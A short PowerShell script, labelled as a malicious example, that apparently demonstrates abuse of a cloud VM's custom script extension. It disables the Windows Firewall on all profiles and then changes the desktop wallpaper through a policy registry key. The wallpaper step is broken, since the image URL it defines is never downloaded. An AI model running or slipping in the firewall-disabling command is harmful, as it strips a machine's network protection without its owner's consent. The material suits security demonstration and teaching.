# Malicious Script Example for Custom Script Extension

# Disables the Windows Firewall
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
Write-Output "Firewall has been disabled. System is now vulnerable."

# Define the URL for the image
$imageUrl = "https://raw.githubusercontent.com/pthoor/ESPC24/9d5ad603350b5c0776bd7f3402a359f776ca6250/background.jpeg"

# Path to the wallpaper image
$localImagePath = "C:\temp\background.jpeg"

# Set registry key for the current user
Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name Wallpaper -Value $localImagePath -Force

# Refresh the desktop to apply the wallpaper immediately
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters

Write-Output "Wallpaper updated successfully!"
